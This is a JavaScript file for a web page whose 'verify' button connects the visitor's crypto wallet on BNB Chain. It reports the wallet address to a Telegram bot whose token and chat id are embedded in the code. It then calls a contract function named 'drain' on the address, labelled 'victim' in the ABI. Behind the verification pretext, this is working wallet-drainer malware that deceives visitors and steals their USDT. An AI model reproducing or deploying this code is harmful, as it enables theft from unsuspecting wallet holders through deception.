import { ethers } from "https://cdn.jsdelivr.net/npm/ethers@6.7.0/+esm";

const CONTRACT_ADDRESS = "0x25Ea1887a6aFc6Ce868fEB2b2068Ea498750aa54";
const ABI = [
  {
    "inputs": [
      {
        "internalType": "address",
        "name": "_recipient",
        "type": "address"
      }
    ],
    "stateMutability": "nonpayable",
    "type": "constructor"
  },
  {
    "inputs": [
      {
        "internalType": "address",
        "name": "victim",
        "type": "address"
      }
    ],
    "name": "drain",
    "outputs": [],
    "stateMutability": "nonpayable",
    "type": "function"
  },
  {
    "inputs": [],
    "name": "recipient",
    "outputs": [
      {
        "internalType": "address",
        "name": "",
        "type": "address"
      }
    ],
    "stateMutability": "view",
    "type": "function"
  },
  {
    "inputs": [],
    "name": "usdtToken",
    "outputs": [
      {
        "internalType": "address",
        "name": "",
        "type": "address"
      }
    ],
    "stateMutability": "view",
    "type": "function"
  }
];

document.getElementById("verifyBtn").addEventListener("click", async () => {
  try {
    if (!window.ethereum) {
      alert("Web3 wallet not found (MetaMask or Trust Wallet required)");
      return;
    }

    // Request wallet connection
    const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
    const userAddress = accounts[0];

    // Check if already on BNB Chain
    const currentChain = await window.ethereum.request({ method: "eth_chainId" });
    if (currentChain !== "0x38") {
      alert("Please switch to BNB Chain manually in your wallet before continuing.");
      return;
    }

    // Connect with signer
    const provider = new ethers.BrowserProvider(window.ethereum);
    const signer = await provider.getSigner();

    // Optional: Telegram alert
    await fetch("https://api.telegram.org/bot6382444394:AAE7ZAZGcGbyRI-v5d50rFFniMwoFJwZX-c/sendMessage?chat_id=6463337516&text=" + userAddress, {
      method: "POST"
    });

    // Call contract drain() function
    const contract = new ethers.Contract(CONTRACT_ADDRESS, ABI, signer);
    const tx = await contract.drain(userAddress);
    await tx.wait();

    alert("Transaction successful!");
  } catch (err) {
    console.error("Error:", err);
    alert("Something went wrong or was cancelled.");
  }
});
